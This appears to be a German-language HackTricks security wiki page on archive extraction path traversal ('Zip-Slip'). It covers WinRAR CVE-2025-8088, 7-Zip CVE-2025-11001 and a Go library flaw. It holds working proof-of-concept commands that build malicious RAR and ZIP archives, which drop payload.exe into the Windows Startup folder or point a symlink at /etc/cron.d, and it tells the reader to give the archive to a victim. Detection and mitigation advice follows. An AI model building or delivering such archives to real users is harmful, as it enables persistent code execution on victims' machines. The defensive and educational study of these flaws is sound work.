# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Überblick

Viele Archivformate (ZIP, RAR, TAR, 7-ZIP, etc.) erlauben, dass jeder Eintrag seinen eigenen **internen Pfad** trägt. Wenn ein Extraktionsprogramm diesen Pfad blind übernimmt, wird ein manipuliertes Dateiname mit `..` oder einem **absoluten Pfad** (z. B. `C:\Windows\System32\`) außerhalb des vom Benutzer gewählten Verzeichnisses geschrieben.
Diese Klasse von Schwachstellen ist weithin bekannt als *Zip-Slip* oder **archive extraction path traversal**.

Konsequenzen reichen von dem Überschreiben beliebiger Dateien bis hin zum direkten Erreichen von **remote code execution (RCE)** durch Ablegen einer Payload an einem **auto-run** Ort wie dem Windows *Startup* Ordner.

## Ursache

1. Angreifer erstellt ein Archiv, in dem ein oder mehrere Datei-Header Folgendes enthalten:
* Relative Traversal-Sequenzen (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute Pfade (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Oder manipulierte **symlinks**, die außerhalb des Zielverzeichnisses aufgelöst werden (häufig bei ZIP/TAR auf *nix*).
2. Das Opfer extrahiert das Archiv mit einem verwundbaren Tool, das dem eingebetteten Pfad vertraut (oder symlinks folgt), anstatt ihn zu bereinigen oder die Extraktion unterhalb des gewählten Verzeichnisses zu erzwingen.
3. Die Datei wird an dem vom Angreifer kontrollierten Ort geschrieben und beim nächsten Auslösen dieses Pfads vom System oder Benutzer ausgeführt/geladen.

### .NET `Path.Combine` + `ZipArchive` traversal

Ein häufiges .NET Anti-Pattern besteht darin, das vorgesehene Ziel mit der vom Benutzer kontrollierten `ZipArchiveEntry.FullName` zu kombinieren und zu extrahieren, ohne den Pfad zu normalisieren:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Wenn `entry.FullName` mit `..\\` beginnt, führt es zu einem path traversal; wenn es ein **absolute path** ist, wird die linke Komponente vollständig verworfen, was zu einem **arbitrary file write** als Extraktionsidentität führt.
- Proof-of-Concept-Archiv, um in ein benachbartes `app`-Verzeichnis zu schreiben, das von einem geplanten Scanner überwacht wird:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Wenn diese ZIP in den überwachten Posteingang gelegt wird, führt das zu `C:\samples\app\0xdf.txt`, was traversal außerhalb von `C:\samples\queue\` beweist und follow-on primitives ermöglicht (z. B. DLL hijacks).

## Praxisbeispiel – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (including the `rar` / `unrar` CLI, the DLL and the portable source) validierte Dateinamen während der Extraktion nicht.
Ein bösartiges RAR-Archiv, das einen Eintrag wie folgt enthält:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
würde **außerhalb** des ausgewählten Ausgabeverzeichnisses und im *Startup*-Ordner des Benutzers landen. Nach der Anmeldung führt Windows automatisch alles dort vorhandene aus und ermöglicht dadurch *persistente* RCE.

### Erstellung eines PoC-Archives (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Verwendete Optionen:
* `-ep`  – speichere Dateipfade exakt wie angegeben (prune führendes `./` **nicht**).

Stelle `evil.rar` dem Opfer zur Verfügung und weise es an, die Datei mit einer verwundbaren WinRAR-Version zu entpacken.

### Observed Exploitation in the Wild

ESET meldete RomCom (Storm-0978/UNC2596) Spear-Phishing-Kampagnen, die RAR-Archive anhängten, welche CVE-2025-8088 ausnutzten, um angepasste Backdoors zu deployen und Ransomware-Operationen zu erleichtern.

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP-Einträge, die **symbolische Links** sind, wurden beim Extrahieren dereferenziert, wodurch Angreifer das Zielverzeichnis verlassen und beliebige Pfade überschreiben konnten. Benutzerinteraktion beschränkt sich auf das *Öffnen/Entpacken* des Archives.
* **Affected**: 7-Zip 21.02–24.09 (Windows- & Linux-Builds). Gefixt in **25.00** (Juli 2025) und später.
* **Impact path**: Überschreiben von `Start Menu/Programs/Startup` oder Dienst-Ausführungsorten → Code läuft beim nächsten Login oder Service-Neustart.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Auf einem gepatchten Build wird `/etc/cron.d` nicht berührt; der Symlink wird als Link innerhalb von /tmp/target extrahiert.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` folgt `../` und symlinked ZIP-Einträgen und schreibt außerhalb von `outputDir`.
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (Projekt inzwischen deprecated).
* **Fix**: Wechsel zu `mholt/archives` ≥ 0.1.0 oder Implementierung von Canonical-Path-Checks vor dem Schreiben.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – Liste die Archive-Einträge auf und markiere jeden Namen, der `../`, `..\\`, *absolute Pfade* (`/`, `C:`) enthält oder Einträge vom Typ *symlink*, deren Ziel außerhalb des Extraktionsverzeichnisses liegt.
* **Canonicalisation** – Stelle sicher, dass `realpath(join(dest, name))` weiterhin mit `dest` beginnt. Andernfalls ablehnen.
* **Sandbox extraction** – Entpacke in ein temporäres Verzeichnis mit einem *sicheren* Extractor (z. B. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) und verifiziere, dass die resultierenden Pfade im Verzeichnis bleiben.
* **Endpoint monitoring** – Alarmiere bei neuen Executables, die in `Startup`/`Run`/`cron`-Orten geschrieben werden, kurz nachdem ein Archiv mit WinRAR/7-Zip/etc. geöffnet wurde.

## Mitigation & Hardening

1. **Update the extractor** – WinRAR 7.13+ und 7-Zip 25.00+ implementieren Pfad-/Symlink-Sanitisation. Beide Tools haben noch kein Auto-Update.
2. Entpacke Archive wenn möglich mit “**Do not extract paths**” / “**Ignore paths**”.
3. Auf Unix: Privilegien herabsetzen & ein **chroot/namespace** mounten vor dem Extrahieren; auf Windows **AppContainer** oder eine sandbox verwenden.
4. Wenn du eigenen Code schreibst, normalisiere mit `realpath()`/`PathCanonicalize()` **bevor** du erstellst/schreibst, und lehne jeden Eintrag ab, der das Zielverzeichnis verlässt.

## Additional Affected / Historical Cases

* 2018 – Massive *Zip-Slip* Advisory von Snyk, das viele Java/Go/JS-Bibliotheken betraf.
* 2023 – 7-Zip CVE-2023-4011, ähnliche Traversal während des `-ao` Merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR-Extraction Traversal in Slugs (Patch in v1.2).
* Jede kundenspezifische Extraktions-Logik, die `PathCanonicalize` / `realpath` vor dem Schreiben nicht aufruft.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
